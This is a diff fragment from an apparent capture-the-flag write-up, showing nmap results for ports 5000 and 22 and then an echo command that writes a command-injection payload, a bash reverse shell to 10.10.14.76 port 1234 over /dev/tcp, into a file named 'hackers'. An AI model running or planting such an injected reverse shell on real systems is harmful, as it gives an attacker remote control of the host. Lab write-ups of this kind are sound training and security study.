@@ -41,4 +41,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 42.09 seconds
 ```
 
+We can see that the ports 5000 and 22 are open, 5000 for http and 22 for ssh
+
+```
 echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.76/1234 0>&1' #" >> hackers
+```
